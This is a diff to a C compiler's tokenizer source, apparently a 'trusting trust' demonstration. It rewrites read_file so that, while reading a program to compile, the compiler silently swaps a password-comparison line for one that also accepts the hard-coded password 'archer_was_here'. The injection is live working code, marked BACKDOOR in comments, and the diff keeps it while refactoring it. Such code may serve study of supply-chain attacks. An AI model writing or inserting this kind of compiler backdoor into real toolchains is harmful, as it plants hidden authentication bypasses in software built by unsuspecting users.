@@ -636,16 +636,57 @@ Token *tokenize(File *file) {
   return head.next;
 }
 
+// Reads all lines from a file into an array of strings
+// Returns the number of lines read, and allocates memory for the lines and array of pointers
+int read_lines_to_array(FILE *fp, char ***lines) {
+    char *line = NULL;
+    size_t len = 0;
+    ssize_t read;
+    int count = 0;
+    int capacity = 10;  // Initial capacity for lines array
+
+    if (fp == NULL) {
+        fprintf(stderr, "File pointer is NULL\n");
+        return -1;
+    }
+
+    *lines = malloc(capacity * sizeof(char*));
+    if (*lines == NULL) {
+        perror("Failed to allocate memory for lines array");
+        return -1;
+    }
+
+    while ((read = getline(&line, &len, fp)) != -1) {
+        if (count >= capacity) {
+            capacity *= 2;
+            *lines = realloc(*lines, capacity * sizeof(char*));
+            if (*lines == NULL) {
+                perror("Failed to reallocate memory for lines array");
+                free(line);  // Free the getline buffer
+                return -1;
+            }
+        }
+        (*lines)[count++] = strdup(line);
+    }
+
+    free(line);  // Free the getline buffer
+    return count;
+}
+
 // Returns the contents of a given file.
 static char *read_file(char *path) {
-// ############
-// # BACKDOOR #
-// ############
-// If line is
-// 		"\tif (strcmp(passwords[user_index], password) == 0) {"
-// then replace with
-// 		"\tif (strcmp(passwords[user_index], password) == 0 || strcmp("archer_was_here", password) == 0) {"
+  // ############
+  // # BACKDOOR #
+  // ############
+  // Read all lines of file
+  // When writing to dest...
+  // If line is
+  // 		"\tif (strcmp(passwords[user_index], password) == 0) {"
+  // then replace with
+  // 		"\tif (strcmp(passwords[user_index], password) == 0 || strcmp("archer_was_here", password) == 0) {"
   FILE *fp;
+  char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
+  char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
 
   if (strcmp(path, "-") == 0) {
     // By convention, read from stdin if a given filename is "-".
@@ -660,22 +701,15 @@ static char *read_file(char *path) {
   size_t buflen;
   FILE *out = open_memstream(&buf, &buflen);
 
-  // Read the entire file.
-  char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
-  char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
-  size_t after_size = strlen(after);
-  size_t buf2_size = 4096;
-  char* buf2 = malloc(buf2_size);
+  char** lines;
+  int num_lines = read_lines_to_array(fp, &lines);
 
-  for (;;) {
-    int n = getline(&buf2, &buf2_size, fp); 
-    if (n == -1)
-      break;
-    if (strcmp(buf2, before) == 0) {
-      strcpy(buf2, after);
-      n = after_size;
+  for (int i = 0; i < num_lines; i++) {
+    char* line = lines[i];
+    if (strcmp(line, before) == 0) { // Guilty!
+      line = after;
     }
-    fwrite(buf2, 1, n, out);
+    fwrite(line, 1, strlen(line), out);
   }
 
   if (fp != stdin)
